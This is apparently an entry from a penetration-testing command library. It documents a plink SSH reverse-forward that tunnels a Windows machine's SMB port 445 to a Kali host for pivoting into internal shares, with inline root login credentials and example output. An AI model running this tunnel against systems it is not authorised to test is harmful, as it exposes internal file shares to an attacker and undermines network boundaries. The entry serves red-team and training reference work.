---
id: aefd8f7d-6b49-4f3a-b5cd-94d75d4e0d34
name: plink-redirect-windows-port-to-kali
type: command
executor: bash
data: 'plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185'
output: null
created_at: '2023-04-06T03:56:23.000111+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - Linux
tags:
  - network-pivoting
  - ssh-forwarding
  - smb
  - kali
verified: true
validated: true
---

# plink-redirect-windows-port-to-kali

## Command

```bash
plink -P $_SSH_PORT -l $_USERNAME -pw $_PASSWORD -C -R 445:127.0.0.1:445 $_KALI_IP
```

## Description

Redirects a Windows SMB port (445) through a Kali Linux SSH server (port 22) for pivoting access to internal Windows shares.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -P $_SSH_PORT | SSH server port (default 22) | No |
| -l $_USERNAME | SSH username | Yes |
| -pw $_PASSWORD | SSH password | Yes |
| -C | Enable compression | No |
| -R 445:127.0.0.1:445 | Remote forward for SMB | Yes |
| $_KALI_IP | Kali pivot IP | Yes |

## Examples

### Basic Usage

```bash
plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185
```

### Advanced Usage

```bash
plink -P 22 -l root -pw some_password -C -N -R 445:127.0.0.1:445 192.168.12.185
```

## Expected Output

```
Using SSH protocol version 2
Access granted
Forwarded ports: 127.0.0.1:445
```
Test with SMB tools on the Kali IP:445.

## Related

- [[procedures/Network-Pivoting-with-Plink-Port-Forwarding]]
- [[tools/Plink]]
